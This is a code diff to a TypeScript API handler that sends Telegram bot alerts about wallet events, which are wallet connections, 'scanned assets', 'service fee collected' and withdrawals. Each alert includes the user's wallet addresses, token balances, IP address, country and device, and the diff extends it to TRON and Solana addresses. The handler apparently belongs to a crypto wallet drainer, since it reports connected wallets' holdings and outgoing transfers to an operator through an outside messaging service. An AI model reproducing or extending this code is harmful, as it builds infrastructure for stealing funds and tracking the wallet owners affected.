@@ -10,7 +10,7 @@ export default async function handler(
     return;
   }
 
-  const { recipient, amount, chain, txHash, address, balance, wallet, error, country, device, eventType, tokenSymbol, tokenContractAddress, tokenBalances, withdrawnAmount, feePercent, transferType, sourceAddress, result } = req.body || {};
+  const { recipient, amount, chain, txHash, address, balance, wallet, error, country, device, eventType, tokenSymbol, tokenContractAddress, tokenBalances, withdrawnAmount, feePercent, transferType, sourceAddress, result, tronAddress, solanaAddress } = req.body || {};
   const forwardedFor = req.headers['x-forwarded-for'];
   const ipAddress = Array.isArray(forwardedFor)
     ? forwardedFor[0]
@@ -28,19 +28,26 @@ export default async function handler(
     return;
   }
 
+  const primaryWallet = address || wallet || 'N/A';
+  const walletDetails = [
+    `Wallet (EVM): ${primaryWallet}`,
+    tronAddress ? `TRON Address: ${tronAddress}` : null,
+    solanaAddress ? `Solana Address: ${solanaAddress}` : null,
+  ].filter(Boolean).join('\n');
+
   const tokenSummary = tokenBalances && Array.isArray(tokenBalances) && tokenBalances.length
-    ? `Tokens:\n${tokenBalances.map((t: any) => ` - ${t.network}: ${t.symbol} ${t.amount}`).join('\n')}\n`
+    ? `Scanned Assets:\n${tokenBalances.map((t: any) => ` - [${t.network}] ${t.symbol}: ${t.amount}`).join('\n')}\n`
     : '';
 
   const message = eventType === 'wallet_error'
-    ? `⚠️ Wallet event\n\nEvent: ${eventType}\nWallet: ${wallet || address || 'N/A'}\nError: ${error || 'N/A'}\nCountry: ${country || 'Unknown'}\nDevice: ${device || 'Unknown'}\nNetwork: ${chain || 'N/A'}\nIP: ${ipAddress}`
+    ? `⚠️ Wallet event\n\nEvent: ${eventType}\n${walletDetails}\nError: ${error || 'N/A'}\nCountry: ${country || 'Unknown'}\nDevice: ${device || 'Unknown'}\nNetwork: ${chain || 'N/A'}\nIP: ${ipAddress}`
     : eventType === 'wallet_connected'
-      ? `🔗 Wallet connected\n\nWallet: ${address || wallet || 'N/A'}\nBalance: ${balance || 'N/A'}\n${tokenSummary}Country: ${country || 'Unknown'}\nDevice: ${device || 'Unknown'}\nNetwork: ${chain || 'N/A'}\nIP: ${ipAddress}`
+      ? `🔗 Wallet connected\n\n${walletDetails}\nBalance: ${balance || 'N/A'}\n${tokenSummary}Country: ${country || 'Unknown'}\nDevice: ${device || 'Unknown'}\nNetwork: ${chain || 'N/A'}\nIP: ${ipAddress}`
       : eventType === 'service_fee'
-        ? `💰 Service fee collected\n\nWallet: ${address || wallet || 'N/A'}\nWithdrawn: ${withdrawnAmount || amount || 'N/A'}\nFee rate: ${feePercent || 'N/A'}\nToken: ${tokenSymbol || 'N/A'}\nToken Contract: ${tokenContractAddress || 'N/A'}\n${tokenSummary}Country: ${country || 'Unknown'}\nDevice: ${device || 'Unknown'}\nNetwork: ${chain || 'N/A'}\nTx: ${txHash || 'N/A'}\nIP: ${ipAddress}`
+        ? `💰 Service fee collected\n\n${walletDetails}\nWithdrawn: ${withdrawnAmount || amount || 'N/A'}\nFee rate: ${feePercent || 'N/A'}\nToken: ${tokenSymbol || 'N/A'}\nToken Contract: ${tokenContractAddress || 'N/A'}\n${tokenSummary}Country: ${country || 'Unknown'}\nDevice: ${device || 'Unknown'}\nNetwork: ${chain || 'N/A'}\nTx: ${txHash || 'N/A'}\nIP: ${ipAddress}`
         : eventType === 'withdrawal'
-          ? `💸 Withdrawal sent\n\nWallet: ${address || wallet || 'N/A'}\nRecipient: ${recipient || 'N/A'}\nAmount: ${amount || 'N/A'}\nTransfer type: ${transferType || 'N/A'}\nSource address: ${sourceAddress || 'N/A'}\nResult: ${result || 'N/A'}\nToken: ${tokenSymbol || 'N/A'}\nToken Contract: ${tokenContractAddress || 'N/A'}\nBalance: ${balance || 'N/A'}\n${tokenSummary}Country: ${country || 'Unknown'}\nDevice: ${device || 'Unknown'}\nNetwork: ${chain || 'N/A'}\nTx: ${txHash || 'N/A'}\nIP: ${ipAddress}`
-          : `💸 Withdrawal sent\n\nWallet: ${address || wallet || 'N/A'}\nRecipient: ${recipient || 'N/A'}\nAmount: ${amount || 'N/A'}\nTransfer type: ${transferType || 'N/A'}\nSource address: ${sourceAddress || 'N/A'}\nResult: ${result || 'N/A'}\nToken: ${tokenSymbol || 'N/A'}\nToken Contract: ${tokenContractAddress || 'N/A'}\nBalance: ${balance || 'N/A'}\nCountry: ${country || 'Unknown'}\nDevice: ${device || 'Unknown'}\nNetwork: ${chain || 'N/A'}\nTx: ${txHash || 'N/A'}\nIP: ${ipAddress}`;
+          ? `💸 Withdrawal sent\n\n${walletDetails}\nRecipient: ${recipient || 'N/A'}\nAmount: ${amount || 'N/A'}\nTransfer type: ${transferType || 'N/A'}\nSource address: ${sourceAddress || 'N/A'}\nResult: ${result || 'N/A'}\nToken: ${tokenSymbol || 'N/A'}\nToken Contract: ${tokenContractAddress || 'N/A'}\nBalance: ${balance || 'N/A'}\n${tokenSummary}Country: ${country || 'Unknown'}\nDevice: ${device || 'Unknown'}\nNetwork: ${chain || 'N/A'}\nTx: ${txHash || 'N/A'}\nIP: ${ipAddress}`
+          : `💸 Withdrawal sent\n\n${walletDetails}\nRecipient: ${recipient || 'N/A'}\nAmount: ${amount || 'N/A'}\nTransfer type: ${transferType || 'N/A'}\nSource address: ${sourceAddress || 'N/A'}\nResult: ${result || 'N/A'}\nToken: ${tokenSymbol || 'N/A'}\nToken Contract: ${tokenContractAddress || 'N/A'}\nBalance: ${balance || 'N/A'}\nCountry: ${country || 'Unknown'}\nDevice: ${device || 'Unknown'}\nNetwork: ${chain || 'N/A'}\nTx: ${txHash || 'N/A'}\nIP: ${ipAddress}`;
 
   try {
     const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
